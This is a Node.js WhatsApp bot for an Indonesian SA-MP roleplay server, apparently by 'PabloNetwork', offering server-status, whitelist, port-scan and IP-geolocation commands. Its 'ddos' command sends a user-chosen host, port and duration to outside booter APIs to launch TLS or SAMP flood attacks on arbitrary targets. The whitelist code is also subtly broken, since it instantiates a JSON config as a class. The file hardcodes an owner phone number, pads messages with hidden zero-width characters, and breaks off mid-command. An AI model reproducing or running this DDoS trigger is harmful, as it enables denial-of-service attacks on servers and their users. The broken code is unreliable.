const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, MessageType, GroupSettingChange, ChatModification } = require("@whiskeysockets/baileys");
const fs = require("fs");
const util = require("util");
const chalk = require("chalk");
const SftpClient = require('ssh2-sftp-client');
const fetch = require('fetch');
const sftpConfig = require('./sftp-config.json');
const databaseconfig = require('./db-config.json');
const axios = require('axios')
const mysql = require('mysql');

module.exports = pablonetwork = async (client, m, chatUpdate) => {
  try {
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    // var prefix = /^[\\/!#.]/gi.test(body) ? body.match(/^[\\/!#.]/gi) : "/"
    var prefix = /^[\\/!#.]/gi.test(body) ? body.match(/^[\\/!#.]/gi) : "/";
    const isCmd2 = body.startsWith(prefix);
    const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await client.decodeJid(client.user.id);
    const itsMe = m.sender == botNumber ? true : false;
    let text = (q = args.join(" "));
    const arg = budy.trim().substring(budy.indexOf(" ") + 1);
    const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);

    const from = m.chat;
    const reply = m.reply;
    const sender = m.sender;
    const mek = chatUpdate.messages[0];

    const color = (text, color) => {
      return !color ? chalk.green(text) : chalk.keyword(color)(text);
    };

    // COMMAND
    const { menu } = require('./nexus/command/menu/menu')

    // Group
    const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : ''
    const qtod = m.quoted? "true":"false"
   
    // Push Message To Console
    let argsLog = budy.length > 30 ? `${q.substring(0, 30)}...` : budy;

    if (isCmd2 && !m.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ LOGS ]")), color(argsLog, "turquoise"), chalk.magenta("From"), chalk.green(pushname), chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`));
    } else if (isCmd2 && m.isGroup) {
      console.log(
        chalk.black(chalk.bgWhite("[ LOGS ]")),
        color(argsLog, "turquoise"),
        chalk.magenta("From"),
        chalk.green(pushname),
        chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`),
        chalk.blueBright("IN"),
        chalk.green(groupName)
      );
    }

    if (isCmd2) {
      switch (command) {
          // CASE CREATED BY PABLO
          // JANGAN MENGUBAH KALAU TIDAK PAHAM
          // KALAU API GA BERFUNGSI BERARTI DOMAIN GW EXPIRED :v

          // SAMP CASE SYSTEM
          // ===========================================================================================================================================================

          case 'samp': {
              if (!text) return m.reply(`Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`)
              if (!text.includes('|') && !text.split(" ").length === 3) return m.reply(`Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`)

              const [ip, port] = text.includes('|') ? text.split("|") : text.split(" ").slice(-2);
              let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=${ip}&port=${port}`

              try {
                  let response = await axios(sampApiUrl)
                  let sampInfo = response.data;

                  // Mengambil nilai dari properti yang diinginkan
                  let serverIP = sampInfo.response.serverip;
                  let address = sampInfo.response.address;
                  let gamemode = sampInfo.response.gamemode;
                  let playerOnline = sampInfo.response.isPlayerOnline;
                  let maxPlayers = sampInfo.response.maxplayers;
                  let hostname = sampInfo.response.hostname;
                  let language = sampInfo.response.language;
                  let lagCompensation = sampInfo.response.rule.lagcomp;
                  let mapName = sampInfo.response.rule.mapname;
                  let version = sampInfo.response.rule.version;
                  let weather = sampInfo.response.rule.weather;
                  let webUrl = sampInfo.response.rule.weburl;
                  let worldTime = sampInfo.response.rule.worldtime;

                  // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
                  let result = `
*${hostname}*
                
> IP:PORT:
> [ ${serverIP} ]

> Gamemode:
> [ ${gamemode} ]

> Players Online:
> [ ${playerOnline} ]

> Max Players: 
> [ ${maxPlayers} ]

> Language: 
> [ ${language} ]

> Map: 
> [ ${mapName} ]

> Version: 
> [ ${version} ]

> Weather:
> [ ${weather} ]

> Url:
> [ ${webUrl} ]

> Time:
> [ ${worldTime} ]`;

                   // Menampilkan informasi pemain online (jika ada)
                   m.reply(result);
               } catch (error) {
                   console.error(error);
                   m.reply(`Unable To Connect ${ip}:${port}`);
               }
          }
          break;

          case 'ipinfo': {
              if (!text) return m.reply(`Kirim perintah:\n${prefix+command} [alamat IP]`)

              let ipAddress = text.trim();
              let ipApiUrl = `https://api.pablonetwork.my.id/API/samp/ipinfo?key=pablo&host=${ipAddress}`;

              try {
                  let response = await axios(ipApiUrl);
                  let ipInfo = await response.data;

                  // Menampilkan informasi alamat IP dari api
                  let result = `
                  *IP INFO:*
 
> IP: 
> [ ${ipInfo.query} ]

> Country: 
> [ ${ipInfo.country} ]

> Country Code: 
> [ ${ipInfo.countryCode} ]

> Region: 
> [ ${ipInfo.region} ]

> Region Name:
> [ ${ipInfo.regionName} ]

> City: 
> [ ${ipInfo.city} ]

> Zip: 
> [ ${ipInfo.zip} ]

> Lat:
> [ ${ipInfo.lat} ]

> Lon:
> [ ${ipInfo.lon} ]

> TimeZone: 
> [ ${ipInfo.timezone} ]

> ISP: 
> [ ${ipInfo.isp} ]

> Organization: 
> [ ${ipInfo.org} ]

> AS: 
> [ ${ipInfo.as} ]

> Mobile: 
> [ ${ipInfo.mobile ? 'Yes' : 'No'} ]
> Proxy: 
> [ ${ipInfo.proxy ? 'Yes' : 'No'} ]
> Hosting: 
> [ ${ipInfo.hosting ? 'Yes' : 'No'} ]`;

                  m.reply(result);
              } catch (error) {
                  console.error(error);
                  m.reply('Terjadi kesalahan saat mengambil informasi alamat IP dari api.pablonetwork.my.id.');
              }
          }
          break;

          case 'portscan': {
              if (!text) return m.reply(`Kirim perintah:\n${prefix+command} ip port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1 7777`)
              
              const [ip, port] = text.trim().split(" ");
              if (!ip || !port) return m.reply('Mohon berikan alamat IP dan nomor port yang valid.');          
              
              let sampApiUrl = `https://api.pablonetwork.my.id/API/samp/portscan?key=pablo&host=${ip}&port=${port}`;

              try {
                  let response = await axios(sampApiUrl)
                  let portscan= response.data;

                  let result = `
> ╭───「 *PORT SCAN* 」─────ఌ︎
> ├──────────────────ఌ︎
> │ *PORT:*
> │ *${portscan.response.status}*`;

                  if (portscan.response.status === 'open') {
                      result += `
> │ *Port terbuka: ${port}*
> ├──────────────────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎
> ╰─── *PabloNetwork* ────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎`;
                  } else {
                      result += `
> │  *Port tertutup.*
> ├──────────────────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎
> ╰─── *PabloNetwork* ────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎`;
                  }

                   m.reply(result);
               } catch (error) {
                   console.error(error);
                   m.reply(`Unable To Connect ${ip}:${port}`);
               }
          }
          break;
          
          case 'pingscan': {
              if (!text) return m.reply(`Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1 7777`)
              
              const [ip, port] = text.trim().split(" ");
              if (!ip || !port) return m.reply('Mohon berikan alamat IP dan nomor port yang valid.');          
              
              let sampApiUrl = `https://api.pablonetwork.my.id/API/samp/ping?key=pablo&host=${ip}&port=${port}`;

              try {
                  let response = await axios(sampApiUrl)
                  let sampping = response.data;

                  let result = `
> ╭───「 *PING SCAN* 」─────ఌ︎
> ├──────────────────ఌ︎
> │ *PING:*
> │ *${sampping.response.ping}*
> ├──────────────────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎
> ╰─── *PabloNetwork* ────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎`;

                   m.reply(result);
               } catch (error) {
                   console.error(error);
                   m.reply(`Unable To Connect ${ip}:${port}`);
               }
          }
          break;

          case 'ddos': {
              if (!text) return m.reply(`Kirim perintah:\n${prefix+command} [methods] [host] [port] [time]`)

              const [jenisAtt, host, port, time] = text.trim().split(" ");
              if (!jenisAtt || !host || !port || !time) return m.reply('Mohon berikan semua parameter yang diperlukan.');

              let apiUrl = '';
              let attType = '';

              if (jenisAtt.toLowerCase() === 'tls') {
                  apiUrl = `https://api-ddos.cyclic.app/?host=${host}&time=${time}&method=TLS`;
                  attType = 'DDoS Attack';
              } else if (jenisAtt.toLowerCase() === 'samp') {
                  apiUrl = `https://flask-production-1db9.up.railway.app/?host=${host}&port=${port}&time=${time}`;
                  attType = 'DDoS Attack';
              } else {
                  return m.reply('Methods tidak valid. Harap pilih "TLS" atau "SAMP".');
              }

              try {
                  let response = await axios(apiUrl);

                  if (!response.ok) {
                      throw new Error(`Terjadi kesalahan saat meminta API. Kode status: ${response.status}`);
                  }

                  m.reply(`*${attType} Successfully Attack Sent!*
                  - Methods: ${jenisAtt}
                  - Host: ${host}
                  - Port: ${port}
                  - Time: ${time}
                  - Sent By PabloNetwork`);
              } catch (error) {
                  console.error(error);
                  m.reply(`Terjadi kesalahan saat melakukan ${attType}. Mohon periksa kembali parameter yang diberikan.`);
              }
          }
          break;

          case 'menu': {
              m.reply(`${menu}`);
          }
          break;

          case 'fivem': {
              m.reply('Fitur Belum Tersedia');
          }
          break;

          case 'mc': {
              m.reply('Fitur Belum Tersedia');
          }
          break;

          case 'wl': {
              const databaseconfig = JSON.parse(fs.readFileSync('db-config.json', 'utf8'));
              const wlGroup = databaseconfig.wlgrup;

              if (m.chat == "") return m.reply('Perintah ini hanya dapat digunakan di grup whitelist.');

              if (!text) return m.reply(`Kirim perintah:\n${prefix}wl [ Nama ]\nContoh .wl Zyrex_Salvador`);
              
              const nama = text.trim();
              const nomorTelepon = m.sender.split('@')[0]; // Mendapatkan nomor telepon pengirim

              // Fungsi untuk memeriksa kata-kata terlarang
              function isToxic(name) {
                  const toxicWords = require('./toxic.json');
                  return toxicWords.some(word => name.toLowerCase().includes(word.toLowerCase()));
              }

              // Baca file database.json jika ada
              let database = {};
              if (fs.existsSync('database.json')) {
                  database = JSON.parse(fs.readFileSync('database.json'));
              }

              // Periksa apakah nama sudah digunakan
              const existingNumber = Object.keys(database).find(number => database[number] === nama);
              if (existingNumber) {
                  return m.reply(`Nama "${nama}" telah digunakan oleh nomor telepon ${existingNumber}.`);
              }

               if (m.body.length > 20) {
              	 return m.reply(`Nama ${nama} terlalu panjang.`);
               }

              // Periksa apakah nomor telepon sudah ada di dalam database
              if (database[nomorTelepon]) {
                  return m.reply(`Anda sudah whitelist sebelumnya.`);
              }

              // Periksa apakah nama mengandung kata-kata terlarang
              if (isToxic(nama)) {
                  return m.reply('Nama yang Anda masukkan mengandung kata-kata terlarang.');
              }

              try {
                  const db = new databaseconfig(); // Inisialisasi objek SFTP
                  const query = 'INSERT INTO whitelist_player (Name) VALUES (?)';

                  await db.connect(databaseconfig);

                  // Membuat file whitelist jika belum ada
                  await db.query(Buffer.from(''), query);

                  // Simpan nama dan nomor telepon ke database
                  database[nomorTelepon] = nama;
                  fs.writeFileSync('database.json', JSON.stringify(database, null, 2));

                  m.reply(`*Dear Warga ECRP !*
 
*Pendaftaran Nama anda berhasil didaftarkan! harap gunakan nama karakter anda dibawah ini untuk Registrasi pada InGame.*
 
*Nama: ${nama}*
 
*IP:* 104.167.222.158:9936 
 
*©2024© Eclipse City Roleplay*`);
              } catch (error) {
                  console.error(error);
                  m.reply('Terjadi kesalahan saat menambahkan nama dan nomor telepon ke whitelist.');
              }
          }
          break;

          case 'unwl': {
              const sftpConfig = JSON.parse(fs.readFileSync('sftp-config.json', 'utf8'));
              const adminGroup = sftpConfig.admingrup;

              if (m.chat == "") return m.reply('Perintah ini hanya dapat digunakan di grup admin.');

              const ownerNumber = '6283146971961'; // Nomor pemilik yang diizinkan untuk menggunakan perintah ini

              if (m.sender.split`@`[0] !== ownerNumber) return m.reply(`Perintah Ini Hanya Dapat Digunakan Oleh Owner`); // Memeriksa apakah pengirim pesan adalah pemilik

              if (!text) return m.reply(`Kirim perintah:\n${prefix}unwl [nama]`);

              const nama = text.trim();

              // Baca file database.json jika ada
              let database = {};
              if (fs.existsSync('database.json')) {
                  database = JSON.parse(fs.readFileSync('database.json'));
              }

              // Cek apakah nama ada di dalam database
              const nomorTelepon = Object.keys(database).find(key => database[key] === nama);
              if (!nomorTelepon) {
                  return m.reply(`Nama "${nama}" tidak ditemukan dalam whitelist.`);
              }

              // Menghapus entri dari database
              delete database[nomorTelepon];
              fs.writeFileSync('database.json', JSON.stringify(database, null, 2));

              // Menghapus entri dari file SFTP
              try {
                  const sftp = new SftpClient(); // Inisialisasi objek SFTP

                  await sftp.connect(sftpConfig);

                  const wlFilePath = `scriptfiles/whitelist/${nama}.txt`;
                  await sftp.delete(wlFilePath); // Menghapus file whitelist dengan nama yang diberikan

                  await sftp.end();
              } catch (error) {
                  console.error(error);
                  return m.reply('Terjadi kesalahan saat menghapus nama dari whitelist.');
              }

              // Beritahu pengguna bahwa nama telah dihapus dari whitelist
              m.reply(`Nama "${nama}" telah dihapus dari whitelist.`);
          }
          break;

          case 'daftarwl': {
              const sftpConfig = JSON.parse(fs.readFileSync('sftp-config.json', 'utf8'));
              const adminGroup = sftpConfig.admingrup;

              if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan dalam grup!');
              if (m.chat == "") return m.reply('Perintah ini hanya dapat digunakan di grup admin.');

              // Baca file database.json jika ada
              let database = {};
              if (fs.existsSync('database.json')) {
                  database = JSON.parse(fs.readFileSync('database.json'));
              }

              // Membuat daftar nama yang terdaftar
              let daftarNama = 'Daftar Nama yang Terdaftar:\n';
              Object.keys(database).forEach(number => {
                  const nama = database[number];
                  daftarNama += `- ${nama} (${number})\n`;
              });

              // Mengirim daftar nama ke pengirim pesan
              m.reply(daftarNama);
          }
          break;

          case 'getid': {
              if (!m.isGroup) return; // Pastikan perintah hanya dapat digunakan di grup

              // Kirim ID grup ke pengguna
              m.reply(`ID grup ini adalah: ${m.chat}`);
          }
          break;

          case 'server': {
              let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=104.167.222.158&port=9936`

              try {
                  let response = await fetch(sampApiUrl)
                  let sampInfo = await response.json()

                  // Mengambil nilai dari properti yang diinginkan
                  let serverIP = sampInfo.response.serverip;
                  let address = sampInfo.response.address;
                  let gamemode = sampInfo.response.gamemode;
                  let playerOnline = sampInfo.response.isPlayerOnline;
                  let maxPlayers = sampInfo.response.maxplayers;
                  let hostname = sampInfo.response.hostname;
                  let language = sampInfo.response.language;
                  let lagCompensation = sampInfo.response.rule.lagcomp;
                  let mapName = sampInfo.response.rule.mapname;
                  let version = sampInfo.response.rule.version;
                  let weather = sampInfo.response.rule.weather;
                  let webUrl = sampInfo.response.rule.weburl;
                  let worldTime = sampInfo.response.rule.worldtime;

                  // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
                  let result = `
*${hostname}*
          
> IP:PORT:
> [ ${serverIP} ]

> Gamemode:
> [ ${gamemode} ]

> Players Online:
> [ ${playerOnline} ]

> Max Players: 
> [ ${maxPlayers} ]

> Language: 
> [ ${language} ]

> Map: 
> [ ${mapName} ]

> Version: 
> [ ${version} ]

> Weather:
> [ ${weather} ]

> Url:
> [ ${webUrl} ]

> Time:
> [ ${worldTime} ]`;

                  // Menampilkan informasi pemain online (jika ada)
                  m.reply(result);
              } catch (error) {
                  console.error(error);
                  m.reply('> Now Server Is Offline 🔴.');
              }
          }
          break;

          case 'player': {
              let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=104.167.222.158&port=9936`

              try {
                  let response = await fetch(sampApiUrl)
                  let sampInfo = await response.json()

                  // Mengambil nilai dari properti yang diinginkan
                  let serverIP = sampInfo.response.serverip;
                  let address = sampInfo.response.address;
                  let gamemode = sampInfo.response.gamemode;
                  let playerOnline = sampInfo.response.isPlayerOnline;
                  let maxPlayers = sampInfo.response.maxplayers;
                  let hostname = sampInfo.response.hostname;
                  let language = sampInfo.response.language;
                  let lagCompensation = sampInfo.response.rule.lagcomp;
                  let mapName = sampInfo.response.rule.mapname;
                  let version = sampInfo.response.rule.version;
                  let weather = sampInfo.response.rule.weather;
                  let webUrl = sampInfo.response.rule.weburl;
                  let worldTime = sampInfo.response.rule.worldtime;

                  // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
                  let result = `
*${hostname}*

> IP:PORT:
> ${serverIP}

> Hostname:
> ${hostname}

> Player Online: 
> ${playerOnline}

> Max Players: 
> ${maxPlayers}`;

                  // Menampilkan informasi pemain online (jika ada)
                  m.reply(result);
              } catch (error) {
                  console.error(error);
                  m.reply('> Now Server Is Offline 🔴.');
              }
          }
          break;

          case 'status': {
              let sampApiUrl = `https://api.pablonetwork.my.id/API/samp?key=pablo&host=104.167.222.158&port=9936`

              try {
                  let response = await fetch(sampApiUrl)
                  let sampInfo = await response.json()

                  // Mengambil nilai dari properti yang diinginkan
                  let serverIP = sampInfo.response.serverip;
                  let address = sampInfo.response.address;
                  let gamemode = sampInfo.response.gamemode;
                  let playerOnline = sampInfo.response.isPlayerOnline;
